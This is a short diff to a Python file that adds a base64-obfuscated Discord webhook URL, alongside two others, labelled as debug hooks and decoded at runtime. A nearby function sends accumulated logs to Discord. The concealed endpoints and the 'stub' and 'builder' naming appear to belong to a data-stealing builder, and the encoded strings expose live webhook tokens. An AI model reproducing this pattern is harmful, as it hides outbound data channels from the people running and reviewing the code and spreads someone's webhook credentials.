@@ -36,7 +36,7 @@ def RX_DB6(msg, level="INFO"):
 # Base64-obfuscated webhook URLs (decoded at runtime)
 _DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ1ODExMTg0ODUwMi9KTnI4R1U5RkFTVUt0WWRzNzdkODNuNkg1WmJ1TUFUOUNVQkVZemZkcjhnbjZxRGZ4Q21XWnd6T0RqMGhKYVVCUUxoWA=="
 _DBG_STUB_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUyMDA2MjcwMzc4MjIwMzQ5NC9zUC1SYlZhdS1mMk9lTkV4TkMxTVotMjJRNGxMd1M4LUlwOVZoZGZCRUFVUVk2R1U1ejQ3Y0xVTW5tVFBlTExvRFVGaA=="
-_DBG_BUILDER_HOOK_B64 = ""
+_DBG_BUILDER_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTkxNDg1MTk5MTAyNzg0NC9yVGNGVlJ6bWV3Y3k0aTdWM3FST09mMUt1N0daQlh5djdBR0pYLUVjWExCZDRLaURZMkhlRy1uSFZ5bl9ScEpzb3ktSA=="
 
 # Send accumulated debug logs to Discord as an embed (respects debug_mode gate)
 def send_debug_embed():
